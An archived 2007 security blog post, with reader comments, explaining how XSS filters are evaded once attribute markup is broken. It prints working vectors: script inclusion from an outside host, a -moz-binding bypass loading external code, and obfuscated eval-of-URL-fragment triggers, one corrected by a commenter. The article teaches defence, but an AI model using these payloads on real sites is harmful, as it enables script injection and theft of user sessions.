<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>The New Dawn Of Filter Evasion</title><meta name="description" content="This article is about the most important phase when attacking web applications. The phase when the markup has just been broken and the attacker will try to inject his own markup, script code or other data - let's call it the PMBP (post-markup-breaking-phase). This phase is mostly possible to occur when quotes aren't correctly sanitized or when input is placed between two tags. In this article we will set the focus on the first variant - the attribute injection. And we will prove that protecting your markup from being broke into is the very most important task in client side security."><meta property="name" content="The New Dawn Of Filter Evasion"><meta itemprop="name" content="The New Dawn Of Filter Evasion"><meta property="description" content="This article is about the most important phase when attacking web applications. The phase when the markup has just been broken and the attacker will try to inject his own markup, script code or other data - let's call it the PMBP (post-markup-breaking-phase). This phase is mostly possible to occur when quotes aren't correctly sanitized or when input is placed between two tags. In this article we will set the focus on the first variant - the attribute injection. And we will prove that protecting your markup from being broke into is the very most important task in client side security."><meta itemprop="description" content="This article is about the most important phase when attacking web applications. The phase when the markup has just been broken and the attacker will try to inject his own markup, script code or other data - let's call it the PMBP (post-markup-breaking-phase). This phase is mostly possible to occur when quotes aren't correctly sanitized or when input is placed between two tags. In this article we will set the focus on the first variant - the attribute injection. And we will prove that protecting your markup from being broke into is the very most important task in client side security."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fthe-new-dawn-of-filter-evasion%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fthe-new-dawn-of-filter-evasion%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/the-new-dawn-of-filter-evasion/"><meta property="og:title" content="The New Dawn Of Filter Evasion"><meta property="og:description" content="This article is about the most important phase when attacking web applications. The phase when the markup has just been broken and the attacker will try to inject his own markup, script code or other data - let's call it the PMBP (post-markup-breaking-phase). This phase is mostly possible to occur when quotes aren't correctly sanitized or when input is placed between two tags. In this article we will set the focus on the first variant - the attribute injection. And we will prove that protecting your markup from being broke into is the very most important task in client side security."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fthe-new-dawn-of-filter-evasion%2F?w=1024"><meta name="twitter:title" content="The New Dawn Of Filter Evasion"><meta name="twitter:description" content="This article is about the most important phase when attacking web applications. The phase when the markup has just been broken and the attacker will try to inject his own markup, script code or other data - let's call it the PMBP (post-markup-breaking-phase). This phase is mostly possible to occur when quotes aren't correctly sanitized or when input is placed between two tags. In this article we will set the focus on the first variant - the attribute injection. And we will prove that protecting your markup from being broke into is the very most important task in client side security."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fthe-new-dawn-of-filter-evasion%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">The New Dawn Of Filter Evasion</h1><div class="date">Fri, 13 Jul 2007 06:57:16 GMT</div><div class="author">by
mario-heiderich</div><div id="post-content"><p>This article is about the most important phase when attacking web applications. The phase when the markup has just been broken and the attacker will try to inject his own markup, script code or other data - let&#39;s call it the PMBP (post-markup-breaking-phase). This phase is mostly possible to occur when quotes aren&#39;t correctly sanitized or when input is placed between two tags. In this article we will set the focus on the first variant - the attribute injection. And we will prove that protecting your markup from being broke into is the very most important task in client side security.</p>
<h2 id="basic-filtering">Basic filtering</h2>
<p>Many developers use standard filter functions to sanitize their output. Mostly a good idea, but the developer has to know what his filters and the attacker is capable of. Some say that the developer is to blame for the bugs, because he/she doesn&#39;t implement properly the security examples as they come from the books. Developers usually does not have enough <em>time</em> and knowledge for cutting edge security research. Mostly of the time they need to chose between stripping the tags, converting HTML and special characters to entities, urlencoding the input, using approaches like <a href="http://php.net/manual/en/function.escapeshellcmd.php">escapeshellcmd()</a> or even combining those filtering methods, in order to secure the applications they are working on. Usually those methods aren&#39;t used and combined with exact knowledge and so they tear open security holes or even cripple the user experience in some situations. Did you know that PHP&#39;s <a href="http://php.net/manual/en/function.escapeshellcmd.php">escapeshellcmd()</a> leaves the characters <code>.-=a-Z0-9, space and /</code> untouched? This function is recommended by several books as a good filter alternative.</p>
<h2 id="get-it-running">Get it running</h2>
<p>So what is the attacker able to do when he/she breaks out the markup, and injects new tags and attributes? When new tags can be injected the site is considered owned - even if there are filters that block script tags and iframes. It is interesting to look at the attributes. Depending on the browser - we&#39;re talking about the two major ones in this article - there are several ways to inject attributes that will fire JavaScript without requiring user interaction. If the attacker breaks out a tag which points to binary contents, like a link tag, an img tag or even an iframe, embed or object we can use the onerror handler and provide a crippled source attribute. Once the browser tries to load a source like <em>xxx</em> it will fail and fire the event - for which we already injected a handler (javascript function call). On the other hand, we can utilize the style tag to create XSS without user interaction. Both gecko based browsers and all important IE versions ship proprietary selectors and methods to execute JavaScript within a style tag or attribute - just to name a few, we have: <em>-moz-binding</em> and <em>expression()</em>. In order to exploit these situations the attacker has to inject more code. I&#39;ve seen several websites where developers seemed to know that and had implemented filters that stripped a bunch of special chars - sometimes dot and brackets, sometimes other stuff - to avoid the injection of active code. Unfortunately, there&#39;s a way to circumvent all of them.</p>
<h2 id="circumvent-the-ignorance">Circumvent the ignorance</h2>
<p>One of the most common filters - never understood why - is the stripping of the pattern <em>http://</em>. It seems thousands of developers out there believe that without this string it&#39;s not possible to get an external inclusion running and furthermore without an external inclusion you can&#39;t do much bad stuff on the targeted application. This is not true. It has been moths ago since I&#39;ve published a miniaturized vector for script inclusions - 20 characters of length which does not have the <em>http://</em> string. The cross browser version is 27 characters in length. Same goes for filtering the dot, brackets, spaces etc. Here is an example:</p>
<pre><code>&lt;script src=//h4k.in </code></pre><p>Some filters transform all user input to uppercase letters - which is more useless than stripping <em>http://</em> string. A major portal about a server side programming languages once suffered from a bad filter which stripped out all event handlers beginning with <em>on\w+</em> and <em>style</em>. This is good example. Plain stripping will <strong>never</strong> make sense - the filter was easily circumvented by the following:</p>
<pre><code>sstyle=&quot;foobar&quot;tstyle=&quot;foobar&quot;ystyle=&quot;foobar&quot;lstyle=&quot;foobar&quot;estyle=&quot;foobar&quot;=-moz-binding:url(http://h4k.in/mozxssc.xml#xss)&gt;foo</code></pre><p>But it&#39;s even getting better. Some weeks ago a pretty new and very intelligent kind of filter evading vectors came to light - these vectors were capable of carrying large payloads in totally stealth mode. These vectors does not require externally hosted scripts to perform the task. This is the reason why they are called <a href="/blog/one-drop-on-a-spider-web">self contained XSS</a>.</p>
<h2 id="cso-s-nightmare">CSO&#39;s nightmare</h2>
<p>Self contained XSS is mostly based on the fact, that it&#39;s possible to pass values via URL, that are seen by the client only, but not by the server. Those values are called fragment identifiers. Everything passed behind the URL hash (#) is only visible to the client which includes the JavaScript runtime engine. So, the attacker just needs to inject a code snippet that evaluates the contents of this part of the URL - which is mostly very short and contains no information of what the real payload consists of. Due to the very dynamic nature of JavaScript it is possible to create <em>myriads</em> of variants of those payload triggers and in combination with browser peculiarities the possibilities of creating these triggers become uncountable. Here is an exmaple</p>
<pre><code>eval.call(this,unescape.call(this,location))
code:_=eval,__=unescape,___=document.URL,_(__(___)) code:with(location)with(hash)eval(substring(1))</code></pre><p>Of course, it&#39;s also possible to rip these functions apart, shuffle their fragments and compose them back together at the end like this:</p>
<pre><code>l=0||&#39;str&#39;,m= 0||&#39;sub&#39;,x= 0||&#39;al&#39;,y= 0||&#39;ev&#39;,g= 0||&#39;tion.h&#39;,f= 0 ||&#39;ash&#39;,k= 0||&#39;loca&#39;,d=(k)+(g)+(f),a</code></pre><h2 id="conclusion-and-credits">Conclusion and credits</h2>
<p>So - why are we showing all those vectors and talking about all the possibilities to hide, obfuscate possible attacks and evade filter mechanisms? To prove a point, I must say! Once the attacker breaks the markup he/she becomes in charge of that content - whether there&#39;s a filter between the application and the user or not. There&#39;s no way of finding a perfect balance between effective filtering and not crippling the user&#39;s experience. To make it short - the PMBP <strong>must</strong> never happen. In order to make this article a dirty cliffhanger - in the next part we will talk about how to avoid this exact phase. We&#39;ll learn how to make sure the user won&#39;t be annoyed by your filter and still guaranteeing stalwart security too. Credits for the shown vectors go the author, the <a href="http://groups.google.de/group/php-ids/">PHPIDS Group</a>, <a href="http://maone.net/">Giorgio Maone</a>, <a href="http://wasjournal.blogspot.com/">Kishor</a>, <a href="http://the-mice.co.uk/switch/">Martin Hinks</a>, <a href="http://christ1an.blogspot.com/">Christian Matthies</a>, <a href="http://www.sirdarckcat.net/">sirdarckcat</a> and the guys from <a href="http://sla.ckers.org/forum/">sla.ckers.org</a>.</p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">good stuff, quite interesting</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/1d95d2324345e3dd2e41d6066cc1b492?s=256&amp;d=retro" alt="david.kierznowski"><span class="post-comment-author">david.kierznowski</span><div class="post-comment-content">Mario, this article is definately a Saturday morning read :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/de37b9dc788b0268d438591e085e4496?s=256&amp;d=retro" alt="sirdarckcat"><span class="post-comment-author">sirdarckcat</span><div class="post-comment-content">:( I'm not in the credits

<a href="http://sla.ckers.org/forum/read.php?2,13209,page=1#msg-13326" rel="nofollow">http://sla.ckers.org/forum/read.php?2,13209,page=1#msg-13326</a>

<pre><code>eval.call(this,unescape.call(this,location))</code></pre>

<pre><code>code:_=eval,__=unescape,___=document.URL,_(__(___)) code:with(location)with(hash)eval(substring(1))</code></pre>

that is from ma1: <a href="http://sla.ckers.org/forum/read.php?2,13209,page=2#msg-13366" rel="nofollow">http://sla.ckers.org/forum/read.php?2,13209,page=2#msg-13366</a>

but based on: <a href="http://sla.ckers.org/forum/read.php?2,13209,page=2#msg-13361" rel="nofollow">http://sla.ckers.org/forum/read.php?2,13209,page=2#msg-13361</a>

and the last vector.. doesn't work:

<pre><code>l=0||'str',m= 0||'sub',x= 0||'al',y= 0||'ev',g= 0||'tion.h',f= 0 ||'ash',k= 0||'loca',d=(k)+(g)+(f),a</code></pre>

a is not defined.. it should be something like..

<pre><code>1[(y)+(x)](d)</code></pre>

instead of a like this:

<pre><code>l=0||'str',m= 0||'sub',x= 0||'al',y= 0||'ev',g= 0||'tion.h',f= 0 ||'ash',k= 0||'loca',d=(k)+(g)+(f),1[(y)+(x)](d)</code></pre>

Greetz!!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">well, I don't know what to say. definitely, we are going to discuss your comments with .mario and see if there is a problem. no worries, there must be some kind of misunderstanding :)

cheers</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/e53f5d616931bfe8fa74bfd9f72e049e?s=256&amp;d=retro" alt=".mario"><span class="post-comment-author">.mario</span><div class="post-comment-content">Hi!

Oh man I am sorry - you are perfectly right. We'll fix that asap!!

The vector was you are talking about is from Martin and worked - but I guess the bolg's filter must have cut something. Here's the full version:

http://groups.google.com/group/php-ids/msg/d6e8871d4f7ce1ef

Greetings,
.mario</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/58ef199dd7af95b190b3f3b08f8f2277?s=256&amp;d=retro" alt="marktwin"><span class="post-comment-author">marktwin</span><div class="post-comment-content">Shame on you who don't give credits.

Correctness it the first thing to look at.

d. c. marktwin</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/e53f5d616931bfe8fa74bfd9f72e049e?s=256&amp;d=retro" alt=".mario"><span class="post-comment-author">.mario</span><div class="post-comment-content">Thx for your comment marktwin. Mistakes happen to (most) people and some even learn of them. Few have reached perfection and avoid them and some of those few even share their knowledge to do so - thx again.

Greetings,
.mario</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/de37b9dc788b0268d438591e085e4496?s=256&amp;d=retro" alt="sirdarckcat"><span class="post-comment-author">sirdarckcat</span><div class="post-comment-content">:P no problem .mario, I hope you get better from that flue.

Greetz!!</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2024 <a href=""></a>. All rights reserved.</p></footer></body></html>